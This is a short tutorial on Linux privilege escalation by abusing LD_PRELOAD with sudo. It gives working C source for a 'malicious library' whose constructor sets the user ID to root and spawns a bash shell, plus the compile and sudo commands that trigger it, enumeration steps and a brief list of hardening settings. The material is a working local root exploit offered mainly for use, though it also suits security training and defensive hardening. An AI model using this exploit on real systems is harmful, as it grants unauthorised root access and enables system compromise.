🔹 What is LD_PRELOAD?
LD_PRELOAD is an environment variable used in Linux to load a custom shared library before others. It lets you override functions in standard libraries, allowing code execution before the target program starts — especially using a constructor function.

🔹 Privilege Escalation Using LD_PRELOAD
If a user can run a dynamically linked binary with sudo, and LD_PRELOAD is not stripped, it’s possible to inject a custom .so file to gain root shell access.

🔹 Exploit Example:
Create malicious library (evil.c):
-----------------------------------------------------------------------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

    __attribute__((constructor)) void preload() {
        unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash");
    }
-----------------------------------------------------------------------------
Compile it:
-----------------------------------------------------------------------------
    gcc -fPIC -shared -o evil.so evil.c
-----------------------------------------------------------------------------
Run it with a sudo-allowed binary:
-----------------------------------------------------------------------------
    LD_PRELOAD=./evil.so sudo /bin/systemctl restart apache2
-----------------------------------------------------------------------------
🔹 Enumeration Steps
Step	Command
🔍 Check sudo rights	sudo -l
🔗 Check if binary is dynamic	file /path/to/binary
🔐 Check if LD_PRELOAD is preserved	`sudo env
⚙️ Test preload injection	LD_PRELOAD=./test.so sudo /allowed/binary

✅ If output confirms execution, the system is vulnerable.

🔹 Prerequisites for Exploitation
    You can run a dynamically linked binary as root (via sudo -l)
    The binary does not strip LD_PRELOAD
    You can write a .so file
    The binary does not drop privileges internally

🔹 Automated Enumeration Script
A script can:
    Create a test .so
    Loop through sudo -l entries
    Check if each binary is:
    Dynamically linked
    Accepts LD_PRELOAD
    Executes the .so payload

🔒 Hardening Protections
secure_path, env_reset	      >>>  Remove dangerous variables
Hardened sudo	                >>>  Strips LD_PRELOAD by default
Static linking                >>>  Makes injection impossible
AppArmor/SELinux/NO_NEW_PRIV  >>>	May block .so injection or restrict actions

✅ Summary
LD_PRELOAD can be a powerful vector for privilege escalation if:
The target binary is dynamically linked
You can run it as root using sudo
Environment is not sanitized
Always validate with enumeration tools or a small test .so.
